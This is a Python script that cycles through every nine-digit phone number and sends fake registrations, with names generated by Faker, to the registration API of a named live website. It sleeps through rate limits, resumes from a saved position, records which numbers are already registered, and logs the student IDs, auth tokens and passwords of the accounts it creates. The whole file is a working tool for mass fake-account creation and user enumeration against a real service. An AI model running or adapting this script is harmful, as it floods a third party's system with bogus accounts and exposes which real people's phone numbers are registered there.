import requests
import time
from faker import Faker
import json
import os

fake = Faker()

MAX_LENGTH = 9
START_AT = open('cum.lol', "r").read()
if not START_AT:
    START_AT = 1

fi = open('cum.lol', "w")

try:
    with open("lol.txt", "a") as f:
        for x in range(int(START_AT), 999_999_999):
            if x == int(START_AT)+500:
                print("[PROC] CLEARING FAKER @ 500")
                fake.unique.clear()
            num_stringified = x.__str__()
            FILLED = num_stringified.zfill(MAX_LENGTH)
            # if FILLED == os.getenv("FILTERED_PHONE_1") or FILLED == os.getenv("FILTERED_PHONE_2") or FILLED == os.getenv("FILTERED_PHONE_3") or FILLED == os.getenv("FILTERED_PHONE_4"):
            #     print("FILTERED")
            #     continue
            r = requests.post("https://beltei.org/api/v1/auth/register", json={ 'firstname': fake.unique.first_name(), 'lastname': fake.unique.last_name(), 'phone': FILLED, 'password': "cum@someonelol.yuri-${0}".format(FILLED), 'uniqueId': "android", 'conditions': True })
            if not r.status_code == 200:
                if int(r.headers.get("x-ratelimit-remaining")) == 0:
                    print("[SLEEP] {0}".format(r.headers.get("retry-after")))
                    time.sleep(int(r.headers.get("retry-after")))
                    print("[SLEEP] STATE DONE")
                    continue
                else:
                    print(r.content) 
                    print(r.headers.__str__())
                    fi.write(x.__str__())
                    fi.close()
                    f.close()
                    break              
            jsoned = r.json()
            if jsoned["code"] == 404 and str(jsoned["message"]).__contains__("registered"):
                f.write("[REGISTERED PHONE]: {0}\n".format(FILLED))
                print("[ALREADY REG]: {0}".format(FILLED))
                continue
            elif jsoned["code"] == 404:
                print(jsoned)
                continue
            f.write("STUDENT_ID: {0} | PHONE: {1} | TOKEN: {2} | PASSWORD: {3}\n".format(jsoned["data"]["student_id"], FILLED, jsoned["data"]["token"], "cum@someonelol.yuri-${0}".format(FILLED)))
            print("[SUCC REG]: {0}".format(jsoned["data"]["student_id"]))
            # time.sleep(0.2)
        f.close()
    fi.close()
except KeyboardInterrupt:
    fi.write((x + 1).__str__())
except SystemExit:
    fi.write((x + 1).__str__())